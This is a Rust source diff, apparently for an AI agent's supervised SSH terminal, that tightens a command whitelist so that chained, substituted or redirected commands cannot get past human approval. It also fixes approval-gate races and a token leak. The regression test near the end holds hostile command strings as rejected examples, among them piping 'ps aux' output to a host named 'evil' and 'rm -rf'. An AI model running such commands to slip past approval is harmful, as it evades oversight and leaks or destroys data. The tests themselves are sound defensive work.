@@ -18,6 +18,12 @@ pub const RECONFIRM_WHITELIST: &[&str] = &["pwd", "printenv", "which", "ps", "sy
 
 pub fn is_whitelisted(cmd: &str) -> bool {
     let t = cmd.trim();
+    // 仅限单条简单命令：复合（; && || | &）、替换（$(` )、重定向（><）、换行
+    // 一律退出白名单——防 `pwd && <任意命令>` 借前缀绕过审批与重确认门槛。
+    const UNSAFE_CHARS: &[char] = &[';', '&', '|', '`', '\n', '>', '<'];
+    if t.contains(UNSAFE_CHARS) || t.contains("$(") {
+        return false;
+    }
     RECONFIRM_WHITELIST
         .iter()
         .any(|w| t == *w || t.starts_with(&format!("{w} ")))
@@ -342,7 +348,7 @@ impl SessionHandle {
             self.live_execs.lock().unwrap().remove(&exec_id);
             return Err(Error::VoidedByHandback { brief: self.gen_brief().await });
         }
-        let _cancel_guard = CancelOnDrop(cancel.clone(), &self.live_execs);
+        let _cancel_guard = CancelOnDrop(exec_id.clone(), cancel.clone(), &self.live_execs);
 
         // 3) 审批门（ADR-5：核心层强制；人类短路）
         let started = Instant::now();
@@ -469,6 +475,7 @@ impl SessionHandle {
             created_at: chrono::Utc::now(),
             status: ApprovalStatus::Pending,
         };
+        let gen_at_entry = self.generation.load(Ordering::SeqCst);
         let (tx, rx) = oneshot::channel();
         {
             let mut decisions = self.center.decisions.lock().unwrap();
@@ -484,7 +491,18 @@ impl SessionHandle {
             .audit
             .append(actor, "approval_requested", Some(&self.id), Some(cmd), serde_json::json!({"segments": eval.segments}), Some(&item.id));
 
-        let gen_at_entry = self.generation.load(Ordering::SeqCst);
+        // 卡片登记与代际捕获之间发生接管 → 登记后复查一次，即时作废返回
+        // （否则该请求会空等到 120s 超时而非立即 VoidedByHandback）
+        if self.generation.load(Ordering::SeqCst) != gen_at_entry {
+            self.mark_status(&item.id, ApprovalStatus::Voided);
+            let voided_item = self.center.items.lock().unwrap().get(&item.id).cloned();
+            if let Some(mut it) = voided_item {
+                it.status = ApprovalStatus::Voided;
+                let _ = self.center.vault.save_approval(&it);
+                let _ = self.center.approvals_tx.send(ApprovalEvent::Updated(it));
+            }
+            return Err(Error::VoidedByHandback { brief: self.gen_brief().await });
+        }
         let decision: DecisionMsg = tokio::select! {
             r = rx => match r {
                 Ok(msg) => msg,
@@ -522,7 +540,7 @@ impl SessionHandle {
                 ))
             }
             DecisionMsg::Decide(Decision::ApproveEdited(c)) => {
-                if !self.center.engine.is_editable_decision(&c) {
+                if !self.center.engine.is_editable_decision(client_id, &c) {
                     self.mark_status(&item.id, ApprovalStatus::Denied);
                     return Err(Error::ApprovalDenied { reason: DeniedReason::DangerousPattern });
                 }
@@ -701,8 +719,8 @@ impl SessionHandle {
         Ok(TakeoverReport { frozen: false, paused_queue: Vec::new(), stopped: Vec::new(), brief: *brief })
     }
 
-    /// 断线 → 尽力重连 → Reconfirming（旅程 2）。
-    pub async fn on_transport_lost(self: &Arc<Self>) {
+    /// 断线 → 尽力重连（不含注入；注入由 pump 在"先订阅"之后调用 reinject_integration）。
+    pub async fn on_transport_reconnect(self: &Arc<Self>) {
         {
             let mut st = self.state.lock().await;
             if *st == SessionState::Closed {
@@ -727,23 +745,6 @@ impl SessionHandle {
                         let mut s = self.screen.lock().await;
                         s.invalidate_cwd();
                     }
-                    let snippet = crate::ssh_integration_snippet();
-                    let mut bytes = snippet.into_bytes();
-                    bytes.push(b'\n');
-                    {
-                        let mut s = self.screen.lock().await;
-                        s.register_outgoing(&bytes, term_core::BlockSource::Human);
-                    }
-                    let _ = self.channel.write(&bytes).await;
-                    for _ in 0..60 {
-                        if self.screen.lock().await.shell_integration_present() {
-                            break;
-                        }
-                        tokio::time::sleep(Duration::from_millis(50)).await;
-                    }
-                    self.verification_hits.store(0, Ordering::SeqCst);
-                    *self.state.lock().await = SessionState::Reconfirming;
-                    self.note_transition("重连成功，进入重确认（仅内置只读白名单可用）").await;
                     return;
                 }
                 Err(e) => {
@@ -753,13 +754,38 @@ impl SessionHandle {
             }
         }
     }
+
+    /// 重连成功后：注入集成（pump 已先订阅新通道）→ 等待生效 → 进入 Reconfirming。
+    pub async fn reinject_integration(self: &Arc<Self>) {
+        let snippet = crate::ssh_integration_snippet();
+        let mut bytes = snippet.into_bytes();
+        bytes.push(b'\n');
+        {
+            let mut s = self.screen.lock().await;
+            s.register_outgoing(&bytes, term_core::BlockSource::Human);
+        }
+        let _ = self.channel.write(&bytes).await;
+        // 窗口 10s：冷容器 + 高负载下首个提示符可能很慢（实测 3s 不够）
+        for _ in 0..200 {
+            if self.screen.lock().await.shell_integration_present() {
+                break;
+            }
+            tokio::time::sleep(Duration::from_millis(50)).await;
+        }
+        self.verification_hits.store(0, Ordering::SeqCst);
+        *self.state.lock().await = SessionState::Reconfirming;
+        self.note_transition("重连成功，进入重确认（仅内置只读白名单可用）").await;
+    }
 }
 
 /// RAII：exec 管线退出时若仍登记 live token，则移除。
-struct CancelOnDrop<'a>(CancellationToken, &'a StdMutex<HashMap<ExecId, CancellationToken>>);
+/// 兜底审批拒绝/作废/超时等异常路径，防 live_execs 泄漏
+/// （run_shell 超时故意保留 running——命令确实仍在远端跑，接管时如实上报）。
+struct CancelOnDrop<'a>(ExecId, CancellationToken, &'a StdMutex<HashMap<ExecId, CancellationToken>>);
 impl<'a> Drop for CancelOnDrop<'a> {
     fn drop(&mut self) {
-        // 仅在异常路径清理；正常路径已在 run_* 中移除
+        // 正常路径已在 run_* 中移除；重复移除无害
+        self.2.lock().unwrap().remove(&self.0);
     }
 }
 
@@ -775,6 +801,26 @@ pub fn sanitize_utf8(text: &str) -> (bool, String) {
     // from_utf8_lossy 已在转换处处理；这里检查是否有替换符
     let has_binary = text.contains('\u{fffd}');
     (has_binary, text.to_string())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn whitelist_only_single_simple_commands() {
+        // M1 回归：前缀匹配不得携带复合/替换/重定向
+        assert!(is_whitelisted("pwd"));
+        assert!(is_whitelisted("ps aux"));
+        assert!(is_whitelisted("systemctl status sshd"));
+        assert!(!is_whitelisted("pwd && touch /tmp/evil"));
+        assert!(!is_whitelisted("pwd; reboot"));
+        assert!(!is_whitelisted("ps aux | curl evil -d @-"));
+        assert!(!is_whitelisted("printenv $(reboot)"));
+        assert!(!is_whitelisted("which `touch /tmp/x`"));
+        assert!(!is_whitelisted("pwd > /tmp/overwrite"));
+        assert!(!is_whitelisted("pwd & rm -rf /tmp/x"));
+    }
 }
 
 /// 审批卡片的目标摘要（命令本身的破坏性提示）。
